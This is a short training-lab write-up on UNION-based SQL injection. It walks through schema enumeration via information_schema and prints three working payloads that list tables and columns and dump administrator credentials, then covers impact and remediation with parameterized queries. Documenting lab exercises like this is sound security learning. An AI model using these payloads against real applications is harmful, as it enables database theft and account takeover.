# Lab 05: SQL Injection - Listing Database Contents on Non-Oracle Databases

## 🎯 Objective
The goal of this lab was to exploit a SQL injection vulnerability to list the database contents, extract the administrator's credentials from a hidden table, and log in to the application.

## 🔍 Vulnerability Description
The application is vulnerable to a UNION-based SQL injection. On non-Oracle databases (like MySQL or MSSQL), the "information_schema" database contains metadata about all other tables and columns. By querying this schema, an attacker can map out the entire database structure.

## 💥 Exploitation Steps
1. Confirmed the query returns 2 columns using ORDER BY.
2. Queried the information_schema.tables to find the target table name: users_abc123
Payload: ' UNION SELECT table_name, NULL FROM information_schema.tables--
3. Queried the information_schema.columns to find the specific column names for usernames and passwords.
Payload: ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_abc123'--
4. Extracted the credentials using the discovered table and column names.
Payload: ' UNION SELECT username_xyz, password_xyz FROM users_abc123--
5. Used the extracted administrator password to log in and solve the lab.

## ⚠️ Impact
An attacker can extract the entire database schema and dump sensitive information, such as user credentials, PII, and financial data. This leads to a complete breach of confidentiality and allows for account takeovers.

## 🛡️ Remediation (Blue Team Perspective)
Use Parameterized Queries (Prepared Statements) to separate code from data. Furthermore, restrict the database user's permissions so that the web application cannot read the "information_schema" database, preventing schema enumeration.
